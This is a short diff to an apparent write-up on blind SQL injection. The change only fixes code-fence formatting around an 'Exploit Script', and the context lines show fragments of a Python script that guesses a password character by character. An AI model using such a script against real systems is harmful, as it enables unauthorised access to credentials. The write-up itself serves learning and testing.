@@ -107,7 +107,7 @@ Here we can get the actual password using a blind sql Injection .
 
 Exploit Script 
 
-```
+```python
 import requests
 
 letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGJIJKLMNOPQRSTUVWXYZ1234567890'
@@ -136,4 +136,4 @@ while 1:
             break
         print(q)
         print(f'Password : {pw}{i}',end='\r')
-        ```
+```
